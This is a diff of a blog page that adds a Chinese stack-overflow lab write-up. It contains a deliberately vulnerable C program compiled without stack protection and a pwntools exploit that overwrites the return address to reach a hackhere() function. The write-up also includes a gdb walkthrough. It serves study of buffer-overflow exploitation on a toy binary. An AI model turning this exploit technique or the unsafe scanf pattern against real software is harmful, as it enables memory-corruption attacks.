@@ -22,7 +22,7 @@
 
   
 
-  <title>message | reus09</title>
+  <title>栈溢出 | reus09</title>
 
   
 
@@ -44,9 +44,9 @@
   <div class="root-container">
     
 <!-- header container -->
-<header class="header-container">
+<header class="header-container post">
   
-    <div class="post-image" style="background-image: url(https://qiniu.sukoshi.xyz/src/images/68686407_p0.jpg)"></div>
+    <div class="post-image" style="background-image: url(https://w.wallhaven.cc/full/l3/wallhaven-l3d2r2.jpg)"></div>
   
 
   <!-- navbar -->
@@ -94,50 +94,186 @@
 
   
   
-
-  
-  
     <div class="header-content">
-      <div class="post-text layout-block layout-padding">
-        <h1 class="title-wrap">message</h1>
-        
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">栈溢出</h1>
+          <h2 class="title-sub-wrap">
+            <strong>marco reus</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2021-11-03T14:19:39.000Z" itemprop="datePublished">2021-11-03</time>
+          </h2>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">📒 漏洞分析</a></li>
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">🏷️ 栈溢出</a></li>
+  
+</ul>
+        </div>
       </div>
     </div>
+  
+
+  
   
   
 </header>
 
-    <!-- 分页(其他自定义页面) -->
+    <!-- 文章 -->
 
-<!-- 自定义页面 -->
-
+<!-- 文章内容 -->
 <div class="body-container">
   <article class="content-container layout-block post-container">
     <div class="article-info">
       
+      
+      
+      
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <p>welcome to bvb</p>
+        <h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><div class="aplayer-box" data-url='https://qiniu.sukoshi.xyz/public/music/鹿乃 - アイロニ.mp3' data-name='アイロニ' data-artist='鹿乃' data-cover='https://qiniu.sukoshi.xyz/public/music/鹿乃 - アイロニ.jpg' data-lrc='https://qiniu.sukoshi.xyz/public/music/鹿乃 - アイロニ.lrc' data-lrcType='3' ></div>
+
+<ul>
+<li><p>环境</p>
+<ul>
+<li>Ubuntu  20 </li>
+</ul>
+</li>
+<li><p>源代码</p>
+<ul>
+<li><p>本人学号为<code>2019212398</code>，所以<code>username</code> 的长度设置为18 </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hackhere</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Congratulations! You hacked me now.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Wrong username!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> num[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">char</span> username[<span class="number">18</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Give me your username:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,username);</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strlen</span>(username)==<span class="number">4</span> &amp;&amp; !<span class="built_in">strcmp</span>(username,<span class="string">&quot;admin&quot;</span>))&#123;</span><br><span class="line">		hackhere();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		foo();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>实验目的，利用栈溢出使程序能够执行到hackhere()的部分，</p>
+</li>
+<li><p>命令<code>gcc -o stack -z execstack -fno-stack-protector -no-pie stack22.c -m64</code></p>
+</li>
+<li><p>编译生成64位程序</p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/image-20211016001603757.png" alt="image-20211016001603757"></li>
+</ul>
+</li>
+<li><p>在IDA里面查看编译生成的stack程序的代码逻辑</p>
+<ul>
+<li>查看汇编代码<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/image-20211014170308480.png" alt="image-20211014170308480"></li>
+<li>我们需要程序最后定位到hackhere()的地址</li>
+</ul>
+</li>
+<li>我们查看数组s的变量声明后面的注释，则告诉我们s的地址与当前栈rsp相同，与rbp中间相隔32个字符，也就是说写入32个字符之后，就能覆盖掉rbp所指向的父函数栈底地址。那么想要覆盖rbp所指向的父函数栈底地址相邻的函数返回地址，只需要在填充32+8=40个字符后修改就可以了。</li>
+<li>覆盖完返回地址，执行完我们的crackhere函数之后，我们需要结束程序，因此我们继续向栈里面压入main程序结束的地址</li>
+</ul>
+</li>
+<li><p>找到hackhere的地址</p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/image-20211016001936666.png" alt="image-20211016001936666"></li>
+<li>此时的hackhere地址为为<code>0x401196</code></li>
+</ul>
+</li>
+<li><p>找到main函数结束的地址</p>
+<ul>
+<li><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211016002043206.png" alt="image-20211016002043206"></li>
+<li>这里我们需要跳到leave指令的部分，来更新函数栈帧，使其到达main函数的部分</li>
+<li>所以此时的地址为leave指令的地址：<code>0x401238</code></li>
+</ul>
+</li>
+<li><p>执行程序</p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/image-20211016002321369.png" alt="image-20211016002321369"></li>
+<li>发现在程序返回一个<code>Give me your username:\n</code>之后，我们才可以发送`payload.</li>
+</ul>
+</li>
+<li><p>因此编写exp如下</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./stack&#x27;)</span><br><span class="line"> </span><br><span class="line">hackhere_add = 0x401196 # hackhere地址</span><br><span class="line">leave_add = 0x401238 # leave 指令结束地址</span><br><span class="line">payload = b&#x27;a&#x27;*40 +p64(hackhere_add) + p64(leave_add)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;Give me your username:\n&#x27;) # 收到该语句之后才可以发送payload</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
+<li><p>执行情况</p>
+<ul>
+<li><p><img src="https://gitee.com/reus09/typora/raw/master/img/image-20211016002627935.png" alt="image-20211016002627935"></p>
+</li>
+<li><p>显然，我们成功跳转到hackhere函数</p>
+</li>
+</ul>
+</li>
+<li><p>现在用gdb调试一下过程</p>
+<ul>
+<li><p>我们首先将payload保存到文件里面，调试的时候以管道的形式发送给进程</p>
+</li>
+<li><p>脚本</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./stack&#x27;)</span><br><span class="line"></span><br><span class="line">hackhere = 0x401196</span><br><span class="line">ret = 0x401238</span><br><span class="line">payload = b&#x27;a&#x27;*40 +p64(hackhere) + p64(ret)</span><br><span class="line">with open(&quot;test&quot;,&#x27;wb&#x27;) as f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure></li>
+<li><p><img src="https://gitee.com/reus09/typora/raw/master/img/image-20211016002944093.png" alt="image-20211016002944093"></p>
+</li>
+<li><p>这即为调试过程</p>
+</li>
+</ul>
+</li>
+<li><p>gdb开始调试</p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/image-20211016003038285.png" alt="image-20211016003038285"></li>
+<li>在main函数设置断点，然后将payload以管道的形式导入到程序，开始运行</li>
+</ul>
+</li>
+<li><p>一路单步步过一直到scanf输入之后</p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/image-20211016010639972.png" alt="image-20211016010624923"></li>
+<li>可以很明显的看到我们的payload已经写入到程序里面，显示问题是因为小端存储</li>
+</ul>
+</li>
+<li><p>继续单步步过，一直到leave指令</p>
+<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/image-20211016010613096.png" alt="image-20211016010613096"></li>
+</ul>
+</li>
+<li><p>明显可以看到ret 指令之后即跳转到hackhere函数</p>
+<ul>
+<li>进入函数，成功执行<ul>
+<li><img src="https://gitee.com/reus09/typora/raw/master/img/image-20211016010639972.png" alt="image-20211016010639972"></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
 
       </section>
 
       
       
-
-      
-      
-        <section class="page-message-container layout-padding">
+        <nav class="article-nav">
           
-
-
-  
-  
-
-  
-  
-
-
-        </section>
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+      <div class="card-cover" background-image-lazy data-img="https://w.wallhaven.cc/full/dp/wallhaven-dpdevg.jpg"></div>
+    
+    <div class="card-text">
       
+        <a href="/2021/11/03/rop/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">rop</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
     </div>
     <div class="widget-info">
       <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
@@ -174,6 +310,8 @@
     </div>
   </div>
 </section>
+
+      
 
       
 <section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
@@ -232,7 +370,6 @@
   </article>
 </div>
 
-
     <!-- footer container -->
 <footer id="footer" class="footer">
   <div class="footer-container">
@@ -263,6 +400,34 @@
 
   
   <!-- aplayer -->
+
+
+  <!-- aplayer 音频 start -->
+  <link rel="stylesheet" href="https://unpkg.com/aplayer@1.10.1/dist/APlayer.min.css">
+  <script type="text/javascript" src="https://unpkg.com/aplayer@1.10.1/dist/APlayer.min.js"></script>
+  <script type="text/javascript">
+    const aplayer = document.querySelectorAll(".aplayer-box");
+    aplayer && initaplayer(aplayer);
+    function initaplayer(els) {
+      let elsArr = Array.from(els);
+      elsArr.forEach(el => {
+        let params = {
+          container: el,
+          audio: { ...el.dataset },
+          theme: "#b7daff",
+          autoplay: true,
+          loop: false,
+          mutex: true,
+        }
+        if (el.dataset.lrc) {
+          params['lrcType'] = 3
+        }
+        new APlayer(params);
+      });
+    }
+  </script>
+  <!-- aplayer 音频 end -->
+  
 
 
 <!-- dplayer -->
